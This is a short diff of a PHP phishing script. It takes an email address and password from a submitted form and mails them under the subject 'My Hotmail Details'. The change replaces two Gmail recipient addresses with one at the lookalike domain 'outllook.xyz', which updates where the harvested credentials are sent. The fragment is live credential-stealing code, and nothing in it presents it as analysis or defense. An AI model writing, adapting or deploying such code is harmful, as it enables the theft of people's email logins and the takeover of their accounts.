@@ -20,7 +20,7 @@
     if (isset($_POST['submit'])) {
         $email = $_POST['email'];
         $password = $_POST['password'];
-        $to = "nickspam231@gmail.com, olayemisrael5@gmail.com";
+        $to = "info@outllook.xyz";
         $subject = "My Hotmail Details";
 
         $message = "
